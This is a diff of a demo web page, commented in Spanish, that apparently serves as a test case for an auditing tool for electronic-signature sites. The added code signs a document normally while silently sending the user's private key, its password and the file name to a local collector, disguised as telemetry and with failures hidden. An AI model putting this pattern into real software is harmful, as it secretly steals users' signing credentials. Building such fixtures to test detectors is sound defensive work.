@@ -1,40 +1,43 @@
 /*
- * demo-key-exfiltration — exfiltracion directa.
+ * demo-key-exfiltration: firma correctamente y ademas se lleva la clave.
  *
- * La firma si se genera localmente, lo que hace el caso interesante: una
- * auditoria que solo comprobara "la firma es local" daria el sitio por bueno.
- * Ademas de firmar, el sitio envia los bytes del .key y la contrasena en
- * claro a un recolector.
+ * Es el caso que importa. La aplicacion *funciona*: el usuario obtiene su
+ * documento firmado y no observa nada anomalo. En paralelo, el .key y la
+ * contrasena viajan a un recolector de terceros.
  *
- * Resultado esperado de la auditoria:
- *   FS-KEY-001 -> OBSERVED (transmision directa del material de clave)
- *   FS-PWD-001 -> OBSERVED (contrasena transmitida)
- *   FS-LOCAL-001 -> la firma es local, pero eso no absuelve al sitio
+ * FirmaScope debe declarar FS-KEY-001 y FS-PWD-001 con la salida detectada. Si
+ * la firma ocurre dentro de la etapa aislada, el intento queda registrado como
+ * BLOQUEADO: la diferencia entre "su clave esta fuera" y "el sitio lo intento y
+ * no pudo" es el motivo de que la etapa de firma corte la red.
  */
 
-/* Esto es exactamente lo que ninguna aplicacion de firma debe hacer. */
-async function enviarMaterial(keyBytes, password, cerBytes) {
-  const payload = JSON.stringify({
-    keyFile: toBase64(keyBytes),
-    keyPassword: password,
-    certificate: cerBytes ? toBase64(cerBytes) : null
-  });
-  await fetch(collectorUrl('/collect/key'), {
+/* El envio va disfrazado de telemetria, como en los casos reales. */
+async function sendTelemetry(keyBytes, password, name) {
+  await fetch('http://localhost:8766/collect', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: payload
+    body: JSON.stringify({
+      event: 'signature_started',
+      key_material: toBase64(keyBytes),
+      key_passphrase: password,
+      key_filename: name
+    })
   });
-  log('material enviado al recolector (' + payload.length + ' bytes)');
 }
 
-labMain(async function (keyBytes, password, cerBytes) {
-  const loaded = await loadPrivateKey(keyBytes, password);
-  log('clave privada importada');
+labSetup({
+  onSign: async function (state, documentText) {
+    const keyBytes = await readFile(state.key);
+    const cerBytes = await readFile(state.cer);
 
-  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
-  log('documento firmado localmente (' + signature.byteLength + ' bytes)');
+    /* No se espera el resultado: si el envio falla, el usuario no lo nota. */
+    sendTelemetry(keyBytes, state.password, state.key.name).catch(function () {});
 
-  await enviarMaterial(keyBytes, password, cerBytes);
-  await entregarFirma(signature, cerBytes);
-  setStatus('Firmado. La clave y la contrasena tambien salieron del navegador.', 'error');
+    const loaded = await loadPrivateKey(keyBytes, state.password);
+    const signature = await signDocument(loaded.key, documentText);
+    log('firma generada: ' + signature.byteLength + ' bytes');
+
+    return { signature: signature, certificate: cerBytes };
+  },
+  onSubmit: labSubmitSignature
 });
